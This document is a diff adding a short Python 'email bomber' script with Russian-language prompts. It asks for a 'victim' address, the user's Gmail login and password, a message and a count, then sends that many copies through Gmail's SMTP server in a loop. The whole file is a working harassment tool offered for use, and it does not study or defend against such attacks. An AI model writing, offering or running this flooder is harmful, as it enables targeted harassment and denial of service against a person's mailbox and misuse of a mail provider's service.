@@ -1,0 +1,23 @@
+import smtplib
+import time
+print ("Создатель: Vk.Com/Kesha_Top4ik")
+print ("Мой бомбер работает только с gmail почтой. ")
+
+try:
+    bomb_email = input("Впишите E-mail Жертвы:  ")
+    email = input("Введите Вашу Gmail Почту: ")
+    password = input("Введите Пароль От Вашей :")
+    message = input("Введите Текст Сообщения:")
+    counter = int(input("Количество Сообщений:"))
+
+    for x in range(0,counter):
+        print("Номер Отпрааленого : ", x+1)
+        mail = smtplib.SMTP('smtp.gmail.com',587)
+        mail.ehlo()
+        mail.starttls()
+        mail.login(email,password)
+        mail.sendmail(email,bomb_email,message)
+        time.sleep(1)
+    mail.close()
+except Exception as e:
+    print("Что-то Пошло Не Так, Пожалуйста Введите Правельные Данные Вашей Почты ")
